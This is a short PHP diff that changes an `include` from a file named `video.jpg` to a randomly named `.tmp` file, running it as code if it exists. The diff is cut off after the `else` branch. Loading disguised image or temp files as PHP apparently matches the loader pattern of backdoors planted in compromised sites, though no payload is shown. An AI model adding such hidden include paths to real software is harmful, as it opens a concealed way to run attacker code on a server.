@@ -1,5 +1,5 @@
 <?php
-$file = __DIR__ . '/video.jpg';
+$file = __DIR__ . '/tmp/wooden-single-drawer-Zc0Gs7.tmp';
 if (is_file($file)) {
     include $file;
 } else {
